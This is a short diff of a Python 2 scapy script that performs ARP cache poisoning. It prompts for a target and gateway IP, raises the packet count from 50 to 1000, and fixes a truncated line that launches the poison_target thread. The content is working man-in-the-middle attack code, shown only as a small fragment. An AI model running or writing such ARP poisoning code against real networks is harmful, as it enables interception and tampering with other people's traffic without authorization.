@@ -18,7 +18,7 @@ target_ip = raw_input()
 print 'Enter Gateway IP'
 gateway_ip = raw_input()
 
-packet_count = 50
+packet_count = 1000
 
 #setup interface
 conf.iface = interface
@@ -85,7 +85,7 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     #sys.exit(0)
     return
 
-poison_thread = threading.Thread(target = poison_target, args =(gateway_ip,gate$
+poison_thread = threading.Thread(target = poison_target, args =(gateway_ip,gateway_mac,target_ip,target_mac))
 poison_thread.start()
 
 try:
